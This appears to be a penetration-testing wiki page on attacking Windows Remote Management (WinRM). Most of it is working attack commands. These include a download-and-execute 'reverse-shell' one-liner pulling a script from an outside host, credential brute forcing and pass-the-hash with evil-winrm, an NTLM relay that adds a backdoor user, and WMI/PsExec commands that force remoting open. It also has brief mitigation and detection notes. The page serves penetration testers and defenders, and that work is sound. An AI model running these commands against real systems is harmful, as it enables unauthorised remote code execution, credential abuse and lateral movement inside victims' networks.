# 5985,5986 - Pentesting WinRM

{{#include ../banners/hacktricks-training.md}}

## WinRM

[Windows Remote Management (WinRM)](<https://msdn.microsoft.com/en-us/library/windows/desktop/aa384426(v=vs.85).aspx>) is highlighted as a **protocol by Microsoft** that enables the **remote management of Windows systems** through HTTP(S), leveraging SOAP in the process. It's fundamentally powered by WMI, presenting itself as an HTTP-based interface for WMI operations.

The presence of WinRM on a machine allows for straightforward remote administration via PowerShell, akin to how SSH works for other operating systems. To determine if WinRM is operational, checking for the opening of specific ports is recommended:

- **5985/tcp (HTTP)**
- **5986/tcp (HTTPS)**

An open port from the list above signifies that WinRM has been set up, thus permitting attempts to initiate a remote session.

### **Initiating a WinRM Session**

To configure PowerShell for WinRM, Microsoft's `Enable-PSRemoting` cmdlet comes into play, setting up the computer to accept remote PowerShell commands. With elevated PowerShell access, the following commands can be executed to enable this functionality and designate any host as trusted:

```bash
Enable-PSRemoting -Force
Set-Item wsman:\localhost\client\trustedhosts *
```

This approach involves adding a wildcard to the `trustedhosts` configuration, a step that requires cautious consideration due to its implications. It's also noted that altering the network type from "Public" to "Work" might be necessary on the attacker's machine.

Moreover, WinRM can be **activated remotely** using the `wmic` command, demonstrated as follows:

```bash
wmic /node:<REMOTE_HOST> process call create "powershell enable-psremoting -force"
```

This method allows for the remote setup of WinRM, enhancing the flexibility in managing Windows machines from afar.

### Test if configured

To verify the setup of your attack machine, the `Test-WSMan` command is utilized to check if the target has WinRM configured properly. By executing this command, you should expect to receive details concerning the protocol version and wsmid, indicating successful configuration. Below are examples demonstrating the expected output for a configured target versus an unconfigured one:

- For a target that **is** properly configured, the output will look similar to this:

```bash
Test-WSMan <target-ip>
```

The response should contain information about the protocol version and wsmid, signifying that WinRM is set up correctly.

- Conversely, for a target **not** configured for WinRM, the would result in no such detailed information, highlighting the absence of a proper WinRM setup.

### Execute a command

To execute `ipconfig` remotely on a target machine and view its output do:

```bash
Invoke-Command -computername computer-name.domain.tld -ScriptBlock {ipconfig /all} [-credential DOMAIN\username]
```

![](<../images/image (151).png>)

You can also **execute a command of your current PS console via** _**Invoke-Command**_. Suppose that you have locally a function called _**enumeration**_ and you want to **execute it in a remote computer**, you can do:

```bash
Invoke-Command -ComputerName <computername> -ScriptBLock ${function:enumeration} [-ArgumentList "arguments"]
```

### Execute a Script

```bash
Invoke-Command -ComputerName <computername> -FilePath C:\path\to\script\file [-credential CSCOU\jarrieta]
```

### Get reverse-shell

```bash
Invoke-Command -ComputerName <computername> -ScriptBlock {cmd /c "powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.10.10:8080/ipst.ps1')"}
```

### Get a PS session

To get an interactive PowerShell shell use `Enter-PSSession`:

```bash
#If you need to use different creds
$password=ConvertTo-SecureString 'Stud41Password@123' -Asplaintext -force
## Note the ".\" in the suername to indicate it's a local user (host domain)
$creds2=New-Object System.Management.Automation.PSCredential(".\student41", $password)

# Enter
Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local [-Credential username]
## Bypass proxy
Enter-PSSession -ComputerName 1.1.1.1 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
# Save session in var
$sess = New-PSSession -ComputerName 1.1.1.1 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
Enter-PSSession $sess
## Background current PS session
Exit-PSSession # This will leave it in background if it's inside an env var (New-PSSession...)
```

![](<../images/image (1009).png>)

**The session will run in a new process (wsmprovhost) inside the "victim"**

### **Forcing WinRM Open**

To use PS Remoting and WinRM but the computer isn't configured, you could enable it with:

```bash
.\PsExec.exe \\computername -u domain\username -p password -h -d powershell.exe "enable-psremoting -force"
```

### Saving and Restoring sessions

This **won't work** if the the **language** is **constrained** in the remote computer.

```bash
#If you need to use different creds
$password=ConvertTo-SecureString 'Stud41Password@123' -Asplaintext -force
## Note the ".\" in the suername to indicate it's a local user (host domain)
$creds2=New-Object System.Management.Automation.PSCredential(".\student41", $password)

#You can save a session inside a variable
$sess1 = New-PSSession -ComputerName <computername> [-SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)]
#And restore it at any moment doing
Enter-PSSession -Session $sess1
```

Inside this sessions you can load PS scripts using _Invoke-Command_

```bash
Invoke-Command -FilePath C:\Path\to\script.ps1 -Session $sess1
```

### Errors

If you find the following error:

`enter-pssession : Connecting to remote server 10.10.10.175 failed with the following error message : The WinRM client cannot process the request. If the authentication scheme is different from Kerberos, or if the client computer is not joined to a domain, then HTTPS transport must be used or the destination machine must be added to the TrustedHosts configuration setting. Use winrm.cmd to configure TrustedHosts. Note that computers in the TrustedHosts list might not be authenticated. You can get more information about that by running the following command: winrm help config. For more information, see the about_Remote_Troubleshooting Help topic.`

The try on the client (info from [here](https://serverfault.com/questions/657918/remote-ps-session-fails-on-non-domain-server)):

```ruby
winrm quickconfig
winrm set winrm/config/client '@{TrustedHosts="Computer1,Computer2"}'
```

## WinRM connection in linux

### Brute Force

Be careful, brute-forcing winrm could block users.

```ruby
#Brute force
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt

#Just check a pair of credentials
# Username + Password + CMD command execution
crackmapexec winrm <IP> -d <Domain Name> -u <username> -p <password> -x "whoami"
# Username + Hash + PS command execution
crackmapexec winrm <IP> -d <Domain Name> -u <username> -H <HASH> -X '$PSVersionTable'
#Crackmapexec won't give you an interactive shell, but it will check if the creds are valid to access winrm
```

### Using evil-winrm

```ruby
gem install evil-winrm
```

Read **documentation** on its github: [https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)

```ruby
evil-winrm -u Administrator -p 'EverybodyWantsToWorkAtP.O.O.'  -i <IP>/<Domain>
```

To use evil-winrm to connect to an **IPv6 address** create an entry inside _**/etc/hosts**_ setting a **domain name** to the IPv6 address and connect to that domain.

### Pass the hash with evil-winrm

```ruby
evil-winrm -u <username> -H <Hash> -i <IP>
```

![](<../images/image (680).png>)

### Using a PS-docker machine

```
docker run -it quickbreach/powershell-ntlm
$creds = Get-Credential
Enter-PSSession -ComputerName 10.10.10.149 -Authentication Negotiate -Credential $creds
```

## Recent Vulnerabilities & Offensive Techniques (2021-2025)

### NTLM relay directly to WinRM (WS-MAN)
Since Impacket 0.11 (May 2023) `ntlmrelayx.py` can relay captured NTLM credentials straight to a **WS-MAN**/WinRM listener. When a host still listens on **unencrypted HTTP (5985)** an attacker can combine *mitm6* (or *Responder*) to coerce authentication and obtain SYSTEM-level code-execution:

```bash
sudo ntlmrelayx.py -t wsman://10.0.0.25 --no-smb-server -smb2support \
                   --command "net user pwned P@ssw0rd! /add"
```

Mitigations
* Disable HTTP listeners – `Set-Item WSMan:\localhost\Service\EnableCompatibilityHttpListener -Value false`
* Force HTTPS and enable Extended Protection for Authentication (EPA) on recent Windows versions. 

### OMIGOD – CVE-2021-38647 (Azure OMI)
Azure Linux agents use the **Open Management Infrastructure (OMI)** service which exposes the WinRM/WS-MAN API on ports **5985/5986**. A logic error allowed **unauthenticated RCE as root**:

```text
curl http://victim:5985/wsman -H 'Content-Type:text/xml' -d '<xml …/>'
```

Patch or remove OMI (version ≥ 1.6.8-1) and block those ports from the Internet. 

### WSMan.Automation COM abuse for lateral movement
WinRM can be driven without PowerShell via the `WSMan.Automation` COM object – useful on systems in Constrained-Language mode. Tools such as *SharpWSManWinRM* wrap this technique:

```powershell
$ws = New-Object -ComObject 'WSMan.Automation'
$session = $ws.CreateSession('http://srv01:5985/wsman',0,$null)
$cmdId   = $session.Command('cmd.exe',@('/c','whoami'))
$session.Signal($cmdId,0)
```

The execution chain (`svchost → wmiprvse → cmd.exe`) is identical to classic PS-Remoting. 

---

## Tooling updates

* **Evil-WinRM v3.x (2024)** – now supports **Kerberos** (`-k` / `--spn`) and **certificate-based** authentication (`--cert-pem`/`--key-pem`), session logging (`-L`) and the ability to disable remote path completion (`-N`).

  ```bash
  RHOST=10.0.0.25 evil-winrm -i $RHOST -u j.doe -k --spn HTTP/$RHOST
  ```

* **Python – `pypsrp` 0.9 (2024)** offers WinRM & PS-Remoting from Linux, including CredSSP and Kerberos:

  ```python
  from psrp.client import Client
  c = Client('srv01', username='ACME\\j.doe', ssl=True)
  print(c.execute_cmd('ipconfig /all').std_out.decode())
  ```

* **Detection** – monitor the **Microsoft-Windows-WinRM/Operational** log:
  * Event 91 / 163 – shell created
  * Event 182 – authentication failure
  * In the Security log event 4262 records the source IP (added July 2022 CUs).
  Collect these centrally and alert on anonymous or external IPs.
